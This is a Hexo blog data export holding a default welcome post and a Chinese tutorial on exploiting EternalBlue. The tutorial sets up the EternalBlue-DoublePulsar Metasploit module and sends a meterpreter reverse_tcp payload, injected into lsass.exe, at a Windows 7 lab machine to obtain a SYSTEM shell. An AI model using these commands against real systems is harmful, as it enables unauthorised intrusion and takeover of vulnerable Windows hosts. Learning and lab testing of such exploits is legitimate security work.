{"meta":{"title":"TIN","subtitle":null,"description":null,"author":"TIN","url":"http://dycsm.github.io"},"pages":[{"title":"about","date":"2018-05-15T13:40:45.000Z","updated":"2018-05-15T13:40:45.331Z","comments":true,"path":"about/index.html","permalink":"http://dycsm.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2018-05-15T11:50:15.965Z","updated":"2018-05-15T11:50:15.965Z","comments":true,"path":"2018/05/15/hello-world/","link":"","permalink":"http://dycsm.github.io/2018/05/15/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"永恒之蓝","slug":"My-New-Post","date":"2017-06-17T16:00:00.000Z","updated":"2018-05-16T08:36:49.703Z","comments":true,"path":"2017/06/18/My-New-Post/","link":"","permalink":"http://dycsm.github.io/2017/06/18/My-New-Post/","excerpt":"","text":"起因最近在学习内网渗透，考虑到永恒家族的重要性，记录一下永恒之蓝的利用过程，一般用在win server 2008和win7上。我们以win7 64位为例子 exploit github地址 目标机器：windows 7 sp1 64位攻击机器：kali 64位 首先我们安装wine32组件。1234dpkg --add-architecture i386apt-get install wine32wine cmd.exeexit 安装完成之后我们把代码git下来 git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git，啊哈，原先以为kali没有装，所以就是直接复制进去的，导致了后面ps中发生的错误我们进入Eternalblue-Doublepulsar-Metasploit目录,并把模块复制到msf对应的目录中cd Eternalblue-Doublepulsar-Metasploitcp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ ps:这边有一个坑，就是我们用cp这个命令的话只是把这个 eternalblue_doublepulsar.rb复制到*/smb/目录下，但是并没有复制deps目录和其中的文件我们可以查看一下eternalblue_doublepulsar.rb里面的内容，发现在这边有个目录/root/Eternalblue-Doublepulsar-Metasploit-master/deps/,是关于deps的，我们这是从github下载的，原先就是已经下载好了的，就是说你要把deps这个目录放在/root/Eternalblue-Doublepulsar-Metasploit-master/下，不然的话会报错。所以这个俩个位置一定要注意看 我们开启msf msfconsole use exploit/windows/smb/eternalblue_doublepulsar 我们设置必要的参数和payload，该模块需要配置的参数较多。 1234567set PROCESSINJECT lsass.exe #设置注入进程的名称，64位的操作系统位lsass.exeset RHOST 192.168.142.128 #设置目标机器的IPset TARGETARCHITECTURE x64 #设置目标机器的系统架构set target 8 #设置目标机器的系统类型，可以使用show targets命令查看支持的操作系统set payload windows/x64/meterpreter/reverse_tcp #设置payload为反向连接的载荷set LHOST 192.168.142.133 #设置反向连接的IP为本机。exploit #执行 这是大佬设置参数，给大家参考一下，懒就不想再做实验了 执行exploit命令之后，获取到目标机器的会话，权限为system 参考链接","categories":[{"name":"First","slug":"First","permalink":"http://dycsm.github.io/categories/First/"}],"tags":[{"name":"First","slug":"First","permalink":"http://dycsm.github.io/tags/First/"},{"name":"Second","slug":"Second","permalink":"http://dycsm.github.io/tags/Second/"}]}]}